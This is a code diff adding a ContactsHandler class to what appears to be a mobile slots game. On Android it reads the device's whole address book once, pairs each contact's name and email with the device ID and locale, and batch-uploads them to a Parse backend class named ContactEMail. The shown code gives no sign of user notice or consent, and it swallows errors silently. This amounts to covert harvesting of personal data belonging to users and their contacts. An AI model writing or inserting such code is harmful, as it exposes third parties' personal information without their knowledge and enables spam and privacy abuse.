@@ -1,0 +1,106 @@
+package com.gotchaslots.common.mobile.utils.xServices.contacts
+{
+	import com.gotchaslots.common.mobile.data.Main;
+	import com.gotchaslots.common.mobile.data.MainEvent;
+	import com.gotchaslots.common.mobile.ui.common.components.SpriteEx;
+	import com.gotchaslots.common.mobile.utils.consts.DeviceTypeEnum;
+	
+	import flash.events.Event;
+	
+	import pl.mllr.extensions.contactEditor.ContactEditor;
+	
+	public class ContactsHandler extends SpriteEx
+	{
+		// members
+		private var _contactEditor:ContactEditor;
+		private var _contacts:Array;
+		private var _contactIndex:int;
+		private var _requests:Array;
+		
+		// class
+		public function ContactsHandler()
+		{
+			super();
+		}
+		
+		// methods
+		public function Fetch():void
+		{
+			if (Main.Instance.Device.DeviceType == DeviceTypeEnum.ANDORID && !Main.Instance.Session.Rare.HasSentContacts)
+			{
+				Main.Instance.Session.Rare.HasSentContacts = true;
+				
+				Main.Instance.addEventListener(MainEvent.Timer, onFetchTimer);
+			}
+			else
+			{
+				dispatchEvent(new Event(Event.COMPLETE));
+			}
+		}
+		
+		// events
+		protected function onFetchTimer(event:Event):void
+		{
+			if (_contactEditor == null)
+			{
+				_contactEditor = new ContactEditor();
+			}
+			else if (_contacts == null)
+			{
+				_contacts = _contactEditor.getContactsSimple();
+			}
+			else if (_requests == null)
+			{
+				_requests = new Array();
+				for (var i:int = 0; i < 100; i++)
+				{
+					try
+					{
+						if (_contactIndex >= _contacts.length)
+						{
+							Main.Instance.removeEventListener(MainEvent.Timer, onFetchTimer);
+							dispatchEvent(new Event(Event.COMPLETE));
+							break;
+						}
+						
+						var contact:Object = _contactEditor.getContactDetails(_contacts[_contactIndex].recordId);
+						_contactIndex++;
+						if (contact)
+						{
+							for (var j:int = 0; j < contact.emails.length; j++)
+							{
+								try
+								{
+									var request:Object = new Object();
+									request.method = "POST";
+									request.path = "/1/classes/ContactEMail";
+									var body:Object = new Object();
+									body.deviceID = Main.Instance.XServices.DeviceID.DeviceID;
+									body.senderName = contact.account_name;
+									body.name = contact.compositename;
+									body.eMail = contact.emails[j];
+									body.locale = Main.Instance.Application.L10N.ActiveLocale.Locale;
+									request.body = body;
+									_requests.push(request);
+								}
+								catch (error:Error)
+								{
+								}
+							}
+						}
+						else
+						{
+						}
+					}
+					catch (error:Error)
+					{
+					}
+				}
+				
+				Main.Instance.XServices.Parse.AddContactEMailBatch(_requests);
+				dispatchEvent(new ContactsHandlerEvent(ContactsHandlerEvent.Progress, _contactIndex / _contacts.length));
+				_requests = null;
+			}
+		}
+	}
+}
